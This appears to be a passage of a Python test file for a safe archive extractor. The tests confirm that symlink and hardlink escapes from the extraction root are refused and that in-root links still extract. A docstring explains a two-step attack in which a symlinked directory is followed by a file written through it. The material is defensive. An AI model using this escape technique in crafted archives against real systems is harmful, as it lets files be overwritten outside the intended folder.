LINKS = ExtractLimits(allow_links=True)


def test_links_pointing_outside_the_root_are_refused_even_when_links_are_allowed(
    tmp_path: Path,
) -> None:
    for name in ("symlink_escape.tar", "symlink_absolute.tar", "hardlink_escape.tar"):
        assert_rejected(corpus(name), tmp_path, UnsafeArchiveError, "link-escape", limits=LINKS)
        (tmp_path / "store" / "keepme.txt").unlink()


def test_a_member_written_through_a_symlinked_directory_is_refused(tmp_path: Path) -> None:
    """``skills -> assets`` followed by ``skills/owned.md``. Both entries pass
    their own check — the link stays in the root, the file has a clean name —
    and only the *combination* writes somewhere the listing never said. That is
    why containment is evaluated over the member set, not per member."""
    assert_rejected(
        corpus("symlink_dir_then_write.tar"),
        tmp_path,
        UnsafeArchiveError,
        "link-in-path",
        limits=LINKS,
    )


def test_in_root_symlink_extracts_when_links_are_explicitly_allowed(tmp_path: Path) -> None:
    dest = tmp_path / "pack"
    safe_extract(corpus("symlink_inside.tar"), dest, limits=LINKS)
    assert (dest / "alias.md").is_symlink()
    assert os.readlink(str(dest / "alias.md")) == "skills/py-style.md"


